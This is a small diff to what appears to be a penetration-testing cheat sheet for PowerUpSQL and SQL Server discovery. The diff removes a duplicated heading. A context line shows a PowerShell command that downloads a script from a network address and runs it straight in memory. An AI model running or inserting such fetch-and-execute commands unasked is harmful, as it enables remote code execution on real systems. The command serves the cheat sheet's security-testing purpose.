@@ -21,10 +21,6 @@ Or load into memory
 IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.0.1/PowerUpSQL.ps1")
 ```
 
-#### SQL Server Discovery Cheats 
-
-
-
 ### SQL Server Discovery Cheats
 
 | Description | Command |
